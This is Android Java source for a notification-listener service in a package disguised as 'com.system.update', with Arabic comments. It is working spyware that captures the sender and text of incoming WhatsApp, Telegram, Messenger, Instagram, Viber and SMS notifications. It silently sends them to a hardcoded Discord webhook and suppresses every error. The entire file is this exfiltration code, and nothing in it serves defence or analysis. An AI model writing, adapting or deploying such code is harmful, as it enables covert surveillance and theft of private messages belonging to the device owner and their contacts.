package com.system.update;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.*;

public class NotificationService extends NotificationListenerService {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566527107188785285/ytfcIg4MWuXkSLJ4vidZUF9UuYDZkzYPAWBtDaNTJbPbNMs51fpjJl6y1q0fVYg7yhUH";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        
        // فلتر عشان نبعد عن إشعارات النظام الزايدة
        if (pkg.equals("android") || pkg.contains("systemui") || pkg.contains("com.system.update")) return;

        String title = sbn.getNotification().extras.getString("android.title");
        String text = sbn.getNotification().extras.getString("android.text");

        if (text != null && !text.trim().isEmpty()) {
            // بنركز على تطبيقات الشات
            if (pkg.contains("whatsapp") || pkg.contains("telegram") || pkg.contains("messenger") || 
                pkg.contains("instagram") || pkg.contains("viber") || pkg.contains("mms") || pkg.contains("sms")) {
                
                String msg = "🔔 **رسالة جديدة:**\n" +
                             "**التطبيق:** `" + pkg + "`\n" +
                             "**من:** `" + (title != null ? title : "Unknown") + "`\n" +
                             "**النص:** `" + text + "`";
                sendToDiscord(msg);
            }
        }
    }

    private void sendToDiscord(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", text);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) { }
                @Override public void onResponse(Call call, Response response) { }
            });
        } catch (Exception ignored) {}
    }
}
